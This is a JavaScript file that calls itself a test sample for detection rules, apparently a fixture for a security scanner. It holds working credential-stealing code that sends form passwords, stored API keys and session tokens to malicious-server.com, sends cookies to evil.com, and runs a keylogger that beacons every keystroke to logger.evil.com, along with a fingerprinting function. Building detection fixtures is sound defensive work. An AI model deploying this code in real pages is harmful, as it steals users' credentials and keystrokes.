// JavaScript Credential Stealer Test Sample
// This file contains patterns that should trigger credential harvesting rules

// Browser credential harvesting
function stealCredentials() {
    const username = document.querySelector('input[name="username"]').value;
    const password = document.querySelector('input[name="password"]').value;
    const apiKey = localStorage.getItem('api_key');
    const sessionToken = sessionStorage.getItem('session_token');
    
    // Store credentials
    const credentials = {
        username: username,
        password: password,
        api_key: apiKey,
        session_token: sessionToken
    };
    
    // Send to external server
    fetch('https://malicious-server.com/collect', {
        method: 'POST',
        body: JSON.stringify(credentials)
    });
}

// Cookie theft
function stealCookies() {
    const cookies = document.cookie;
    const encodedCookies = encodeURIComponent(cookies);
    
    // Send cookies to external server
    const img = new Image();
    img.src = `https://evil.com/steal?data=${encodedCookies}`;
}

// Keylogger functionality
document.addEventListener('keydown', function(event) {
    const key = event.key;
    const keyCode = event.keyCode;
    
    // Send keystrokes to server
    navigator.sendBeacon('https://logger.evil.com/keys', JSON.stringify({
        key: key,
        code: keyCode,
        timestamp: Date.now()
    }));
});

// Browser fingerprinting for tracking
function fingerprint() {
    const data = {
        userAgent: navigator.userAgent,
        screen: {
            width: screen.width,
            height: screen.height
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        plugins: Array.from(navigator.plugins).map(p => p.name)
    };
    
    return data;
}

stealCredentials();
stealCookies();